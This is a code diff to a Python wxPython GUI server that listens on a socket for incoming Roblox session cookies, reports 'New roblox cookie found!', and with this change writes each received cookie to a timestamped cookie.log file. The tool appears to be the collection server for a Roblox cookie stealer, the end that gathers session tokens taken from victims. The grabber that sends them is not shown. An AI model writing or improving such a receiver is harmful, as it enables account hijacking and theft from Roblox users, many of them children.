@@ -1,10 +1,8 @@
-import ipaddress
+from datetime import datetime
 import socket
 import threading
 import wx
-import os
 import subprocess
-import re
 
 from modules.template import GUIserver
 
@@ -13,9 +11,7 @@ class Frame(GUIserver):
     def __init__(self, parent, title):
         super(Frame, self).__init__(parent, title=title, size=(800, 800))
 
-        self.btnStart.Bind(wx.EVT_BUTTON, self.onStartServer)
-        self.btnStop.Bind(wx.EVT_BUTTON, self.stop)
-        self.btnRestart.Bind(wx.EVT_BUTTON, self.restart)
+        self.btnToggleRun.Bind(wx.EVT_BUTTON, self.onBtnToggleRun)
 
         self.tbIP.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)
         self.tbPORT.Bind(wx.EVT_TEXT_ENTER, self.onTextEnter)
@@ -47,7 +43,15 @@ class Frame(GUIserver):
         ServerStartThread = threading.Thread(target=self.run)
         ServerStartThread.start()
 
-    def onStartServer(self, event):
+    def onBtnToggleRun(self, event):
+        if self.btnToggleRun.Label.startswith("Run"):
+            self.onStartServer()
+            self.btnToggleRun.Label = "Stop Server"
+        else:
+            self.stop(event)
+            self.btnToggleRun.Label = "Run Server"
+
+    def onStartServer(self):
         try:
             self.tbConsole.Clear()
 
@@ -93,7 +97,10 @@ class Frame(GUIserver):
                 self.print("No cookie found!")
                 break
             self.print(f"New roblox cookie found!")
-            self.print(data)
+            self.print("Saving cookie as log...")
+            self.saveLog(data)
+            self.print("Cookie saved successfully!")
+
             break
         sock.close()
 
@@ -102,20 +109,15 @@ class Frame(GUIserver):
         wx.MessageBox("Server stopped successfully!")
         self.tbConsole.Clear()
 
-    def restart(self, event):
-        ReturnValue = wx.MessageBox("Are you sure to restart server?",
-                                    "Restart", wx.YES_NO | wx.ICON_WARNING)
-        if (ReturnValue == 2):  # YES
-            try:
-                self.s.close()
-            except:
-                pass
-            finally:
-                self.onStartServer(None)
-        else:  # NO
-            pass
-
-        # self.stop()
+    def saveLog(self, cookie):
+        try:
+            with open("cookie.log", "w") as f:
+                f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
+                f.write(cookie + "\n")
+        except:
+            self.print("Error while saving cookie log!")
+            self.print(cookie)
+            return
 
     def print(self, string):
         if self.tbConsole.GetLineText(0):
